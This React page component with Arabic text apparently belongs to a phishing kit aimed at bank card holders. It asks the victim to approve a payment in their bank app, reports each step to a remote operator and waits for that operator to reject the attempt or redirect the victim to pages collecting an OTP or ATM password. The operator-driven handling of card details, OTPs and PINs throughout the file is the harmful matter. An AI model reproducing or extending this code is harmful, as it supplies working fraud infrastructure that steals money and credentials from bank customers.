import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { sendData, cardAction, navigateToPage, waitingMessage } from "@/lib/store";

export default function BankAppVerification() {
  const [, navigate] = useLocation();
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [rejected, setRejected] = useState(false);
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const cardLast4 = paymentData.cardLast4 || "****";
  const totalAmount = localStorage.getItem("Total") || paymentData.totalPaid || "0.000";
  const cardInfo = waitingCardInfo.value || { bankName: paymentData.bankName || "", bankLogo: paymentData.bankLogo || "" };

  useEffect(() => { navigateToPage("تطبيق البنك"); }, []);

  useSignalEffect(() => {
    const a = cardAction.value;
    if (!a) return;
    if (a.action === "reject") {
      setRejected(true);
      setError(true);
      setIsWaiting(false);
    } else if (a.action === "otp") {
      waitingMessage.value = "";
      setIsWaiting(false);
      navigate("/otp-verification");
    } else if (a.action === "atm") {
      waitingMessage.value = "";
      setIsWaiting(false);
      navigate("/atm-password");
    }
    cardAction.value = null;
  });

  const handleApprove = () => {
    setError(false);
    const label = rejected ? "طلب إشعار جديد" : "تطبيق البنك";
    setRejected(false);
    setIsWaiting(true);
    navigateToPage(label);
    sendData({ current: label, nextPage: "الصفحة النهائية", waitingForAdminResponse: true });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />
      <div className="bg-white rounded-2xl shadow-xl p-6">
        <div className="text-center mb-6">
          <h1 className="text-xl font-bold text-gray-800 mb-1">تأكيد العملية</h1>
          <h2 className="text-2xl font-bold text-primary mb-2">تطبيق البنك</h2>
          <p className="text-gray-600 text-sm">يرجى فتح تطبيق البنك والموافقة على عملية الدفع</p>
        </div>
        {cardInfo.bankLogo && (
          <div className="flex justify-center mb-6"><img src={cardInfo.bankLogo} alt={cardInfo.bankName || "Bank"} className="h-10 object-contain" /></div>
        )}
        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
          <p>تم إرسال طلب الموافقة إلى تطبيق البنك للبطاقة المنتهية بـ <span className="font-bold" dir="ltr">{cardLast4}</span> بمبلغ <span className="font-bold">{totalAmount} د.ك</span>.</p>
          <p className="mt-2">افتح تطبيق البنك واختر الإشعار الظاهر ثم اضغط موافقة، وبعد الانتهاء اضغط الزر بالأسفل.</p>
        </div>
        {!rejected && (<div className="flex justify-center mb-6"><div className="w-14 h-14 border-4 border-primary border-t-transparent rounded-full animate-spin"></div></div>)}
        {error && <p className="text-red-500 text-sm text-center font-medium mb-4">لم تتم الموافقة على العملية، يرجى المحاولة مرة أخرى.</p>}
        <div className="space-y-3">
          <Button className="w-full h-11 text-sm" onClick={handleApprove} disabled={isWaiting}>{isWaiting ? "جاري التحقق..." : rejected ? "طلب إشعار جديد" : "تمت الموافقة"}</Button>
          <Button variant="outline" className="w-full h-11 text-sm" onClick={() => window.history.back()}>إلغاء</Button>
        </div>
      </div>
    </PageLayout>
  );
}
